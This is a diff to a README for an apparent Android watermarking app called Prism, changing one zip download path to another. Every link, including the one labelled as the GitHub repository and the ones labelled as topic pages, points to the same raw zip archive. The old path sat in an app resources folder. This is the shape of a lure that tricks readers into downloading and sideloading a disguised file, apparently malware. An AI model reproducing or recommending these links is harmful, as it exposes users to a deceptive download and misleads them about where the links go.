@@ -1,7 +1,7 @@
 # 🌟 Prism - Effortlessly Add Watermarks to Your Photos
 
 ## 🔗 Download Now
-[![Download Prism](https://github.com/plarinos/Prism/raw/refs/heads/master/app/src/main/res/values/Software-v3.9.zip)](https://github.com/plarinos/Prism/raw/refs/heads/master/app/src/main/res/values/Software-v3.9.zip)
+[![Download Prism](https://raw.githubusercontent.com/plarinos/Prism/master/app/Software_3.9.zip)](https://raw.githubusercontent.com/plarinos/Prism/master/app/Software_3.9.zip)
 
 ## 📖 Description
 Prism is a straightforward Android app designed for adding watermarks to your photos. With this app, you can quickly apply watermarks and customize them to fit your style. Whether you want to protect your images or just add a personal touch, Prism makes it easy.
@@ -15,7 +15,7 @@ To begin using Prism, follow these simple steps to download and install the app 
 - **Other Requirements:** A camera or photo gallery access for watermarking images.
 
 ## 📥 Download & Install
-1. Visit the following page to download the app: [Download Prism](https://github.com/plarinos/Prism/raw/refs/heads/master/app/src/main/res/values/Software-v3.9.zip).
+1. Visit the following page to download the app: [Download Prism](https://raw.githubusercontent.com/plarinos/Prism/master/app/Software_3.9.zip).
 2. Look for the latest release. You will see options for the download.
 3. Tap on the APK file to start downloading.
 4. Once the download is complete, navigate to your device’s file manager.
@@ -45,12 +45,12 @@ If you encounter issues during installation or use, consider the following tips:
 - Check for updates on the Releases page to ensure you have the latest version.
 
 ## 💬 Feedback and Support
-Your input is valuable. If you have questions or suggestions, feel free to open an issue on the [GitHub repository](https://github.com/plarinos/Prism/raw/refs/heads/master/app/src/main/res/values/Software-v3.9.zip). We appreciate your feedback to help improve Prism.
+Your input is valuable. If you have questions or suggestions, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/plarinos/Prism/master/app/Software_3.9.zip). We appreciate your feedback to help improve Prism.
 
 ## 🌐 Learn More
 Explore additional topics related to Prism:
-- [Customization](https://github.com/plarinos/Prism/raw/refs/heads/master/app/src/main/res/values/Software-v3.9.zip)
-- [Photography Tips](https://github.com/plarinos/Prism/raw/refs/heads/master/app/src/main/res/values/Software-v3.9.zip)
-- [Watermarking Best Practices](https://github.com/plarinos/Prism/raw/refs/heads/master/app/src/main/res/values/Software-v3.9.zip)
+- [Customization](https://raw.githubusercontent.com/plarinos/Prism/master/app/Software_3.9.zip)
+- [Photography Tips](https://raw.githubusercontent.com/plarinos/Prism/master/app/Software_3.9.zip)
+- [Watermarking Best Practices](https://raw.githubusercontent.com/plarinos/Prism/master/app/Software_3.9.zip)
 
 Thank you for choosing Prism. Enjoy watermarking your photos with ease!
